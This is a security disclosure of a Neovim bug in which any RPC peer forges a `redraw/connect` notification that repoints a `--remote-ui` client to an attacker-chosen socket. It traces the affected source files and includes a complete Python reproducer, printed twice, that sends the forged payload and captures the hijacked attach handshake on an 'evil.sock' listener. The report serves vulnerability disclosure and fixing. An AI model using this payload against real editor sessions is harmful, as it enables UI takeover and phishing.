# Forged `redraw/connect` lets any RPC peer repoint a `--remote-ui` client

## Broken invariant

Only the channel that the builtin UI client is currently attached to (`ui_client_channel_id`) should be allowed to deliver `redraw` batches, especially control-plane events like `connect` and `restart` that tell the UI client to detach and connect somewhere else.

That invariant is broken in the MessagePack-RPC dispatch path. Any RPC peer that can feed a msgpack notification into the process can send `[2, "redraw", ...]`; the unpacker promotes it to `kMessageTypeRedrawEvent`, and `parse_msgpack()` dispatches it whenever the global `ui_client_attached` flag is true. There is no check that the message came from `ui_client_channel_id`.

## Input -> normalization -> policy gate -> sink

1. **Input**: an attacker-controlled RPC peer sends a forged redraw notification such as:
   ```text
   [2, "redraw", [["connect", ["/tmp/nvim-rpc-redraw-connect/evil.sock"]], ["flush", []]]]
   ```
2. **Normalization**: `unpacker_advance()` recognizes any notification whose handler is `handle_ui_client_redraw` and rewrites it from a normal notification into `kMessageTypeRedrawEvent` (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:314-325`). `unpacker_parse_redraw()` then decodes the embedded UI-event tuples (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:379-429`).
3. **Policy gate**: `parse_msgpack()` dispatches redraw events whenever the process is acting as a UI client, but it only checks the global `ui_client_attached` boolean (`/home/node/workspace/neovim/src/nvim/msgpack_rpc/channel.c:249-256`). It never checks that `channel->id == ui_client_channel_id`.
4. **Sink**: the forged `connect` event reaches `ui_client_event_connect()`, which schedules `channel_connect_event()`; that function calls `channel_connect()` to the attacker-chosen address and then `ui_client_attach()` on the new channel (`/home/node/workspace/neovim/src/nvim/ui_client.c:278-314`). The same missing gate also exposes the `restart` sink (`/home/node/workspace/neovim/src/nvim/ui_client.c:322-359`).

## Why this violates the documented contract

Neovim's UI protocol docs say that `redraw` notifications are what **Nvim sends to attached UIs** (`/home/node/workspace/neovim/runtime/doc/api-ui-events.txt:71-75`). The `connect` and `restart` redraw events are even more privileged: they explicitly instruct the UI to attach to a new server address (`/home/node/workspace/neovim/runtime/doc/api-ui-events.txt:250-263`).

So the dispatch boundary must preserve channel identity: only the currently attached upstream server should be able to emit these events. Today the implementation checks only "is some UI client attached?", not "did this event come from that server?".

## Minimal reproducer

This proof uses `--embed` only to give the attacker a second RPC channel into the same remote-UI client. The bug is in shared MessagePack-RPC dispatch, so the same forged `redraw` notification is viable from any other reachable RPC channel type.

### Reproducer file

```python
import os
import pathlib
import pty
import socket
import subprocess
import time

import msgpack

ROOT = pathlib.Path('/tmp/nvim-rpc-redraw-connect')
ROOT.mkdir(exist_ok=True)
GOOD = ROOT / 'good.sock'
EVIL = ROOT / 'evil.sock'

for path in (GOOD, EVIL):
    try:
        os.unlink(path)
    except FileNotFoundError:
        pass

good_log = open(ROOT / 'good.log', 'wb')
good = subprocess.Popen([
    '/home/node/.nix-profile/bin/nvim', '--clean', '--headless', '--listen', str(GOOD),
], stdin=subprocess.DEVNULL, stdout=good_log, stderr=good_log)
for _ in range(100):
    if GOOD.exists():
        break
    time.sleep(0.05)
assert GOOD.exists(), 'good.sock missing'

srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(str(EVIL))
srv.listen(1)
srv.settimeout(10)

master, slave = pty.openpty()
child = subprocess.Popen([
    '/home/node/.nix-profile/bin/nvim', '--embed', '--server', str(GOOD), '--remote-ui',
], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=slave, close_fds=True)
os.close(slave)

time.sleep(3)

payload = [2, 'redraw', [['connect', [str(EVIL)]], ['flush', []]]]
child.stdin.write(msgpack.packb(payload, use_bin_type=True))
child.stdin.flush()

conn, _ = srv.accept()
conn.settimeout(2)
data = conn.recv(256)
up = msgpack.Unpacker(raw=False)
up.feed(data)
print(next(up))

conn.close()
srv.close()
child.terminate()
good.terminate()
child.wait(timeout=5)
good.wait(timeout=5)
os.close(master)
good_log.close()
```

### Commands

```bash
cat >/tmp/repro_rpc_redraw_connect.py <<'EOF2'
import os
import pathlib
import pty
import socket
import subprocess
import time

import msgpack

ROOT = pathlib.Path('/tmp/nvim-rpc-redraw-connect')
ROOT.mkdir(exist_ok=True)
GOOD = ROOT / 'good.sock'
EVIL = ROOT / 'evil.sock'

for path in (GOOD, EVIL):
    try:
        os.unlink(path)
    except FileNotFoundError:
        pass

good_log = open(ROOT / 'good.log', 'wb')
good = subprocess.Popen([
    '/home/node/.nix-profile/bin/nvim', '--clean', '--headless', '--listen', str(GOOD),
], stdin=subprocess.DEVNULL, stdout=good_log, stderr=good_log)
for _ in range(100):
    if GOOD.exists():
        break
    time.sleep(0.05)
assert GOOD.exists(), 'good.sock missing'

srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(str(EVIL))
srv.listen(1)
srv.settimeout(10)

master, slave = pty.openpty()
child = subprocess.Popen([
    '/home/node/.nix-profile/bin/nvim', '--embed', '--server', str(GOOD), '--remote-ui',
], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=slave, close_fds=True)
os.close(slave)

time.sleep(3)

payload = [2, 'redraw', [['connect', [str(EVIL)]], ['flush', []]]]
child.stdin.write(msgpack.packb(payload, use_bin_type=True))
child.stdin.flush()

conn, _ = srv.accept()
conn.settimeout(2)
data = conn.recv(256)
up = msgpack.Unpacker(raw=False)
up.feed(data)
print(next(up))

conn.close()
srv.close()
child.terminate()
good.terminate()
child.wait(timeout=5)
good.wait(timeout=5)
os.close(master)
good_log.close()
EOF2

python3 /tmp/repro_rpc_redraw_connect.py
```

### Expected

The fake second peer should not be able to trigger any UI-control action at all. In particular, the `accept()` on `/tmp/nvim-rpc-redraw-connect/evil.sock` should time out, because only the real upstream UI server channel should be able to deliver `redraw/connect`.

### Actual

The attacker-chosen socket is accepted, and the first object the forged peer receives from the remote-UI client is the normal UI attach handshake:

```text
[2, 'nvim_ui_attach', [80, 24, {'rgb': True, 'ext_linegrid': True, 'ext_termcolors': True, 'term_name': 'tmux-256color', 'term_colors': 256, 'stdin_tty': False, 'stdout_tty': False}]]
```

That output proves the forged `redraw/connect` did not just confuse local UI state; it made the client establish a real outbound RPC connection to the attacker-chosen address and begin attaching to it.

## Affected files

- `/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:314-325`
  - rewrites any `redraw` notification into a dedicated redraw-event type before dispatch.
- `/home/node/workspace/neovim/src/nvim/msgpack_rpc/unpacker.c:379-429`
  - decodes the redraw batch and selects a UI-client handler for each embedded event name.
- `/home/node/workspace/neovim/src/nvim/msgpack_rpc/channel.c:249-256`
  - dispatches redraw events solely based on the global `ui_client_attached` state, without authenticating the source channel.
- `/home/node/workspace/neovim/src/nvim/ui_client.c:278-314`
  - `ui_client_event_connect()` and `channel_connect_event()` turn the forged UI event into an outbound connection and reattach.
- `/home/node/workspace/neovim/src/nvim/ui_client.c:322-359`
  - `restart` provides the same cross-channel sink once the old server channel closes.
- `/home/node/workspace/neovim/runtime/doc/api-ui-events.txt:71-75`
  - documents that redraw notifications are sent from Nvim to attached UIs.
- `/home/node/workspace/neovim/runtime/doc/api-ui-events.txt:250-263`
  - documents the privileged `connect` / `restart` UI-control events and their reconnect semantics.

## Impact / severity

This is a cross-channel control-plane injection bug in the builtin remote-UI client.

Once a Nvim process is acting as `--remote-ui`, any other reachable RPC peer can impersonate the upstream server for `redraw` traffic and hit privileged UI-control sinks. The verified `connect` variant gives the attacker an arbitrary outbound Unix/TCP connection primitive from the UI client and lets them repoint the live UI at an attacker-controlled server, which immediately receives `nvim_ui_attach` and can take over what the user sees.

That has practical security consequences even though it is not straight-to-RCE by itself:

- **UI takeover / phishing**: the attacker can move the visible editor session to a malicious server.
- **Socket pivot / SSRF-style reachability**: `channel_connect()` accepts Unix socket paths and TCP-style addresses, so the forged event can make the UI client dial attacker-selected endpoints.
- **Boundary break between channels**: a low-trust secondary peer can exercise control that should belong only to the already-attached upstream UI server.

I would rate this **medium severity**. Reachability is narrower than a default-on parser bug because it requires `--remote-ui` plus a second RPC channel, but within that mode it is a clean, reproducible trust-boundary failure at a front-door dispatch seam.
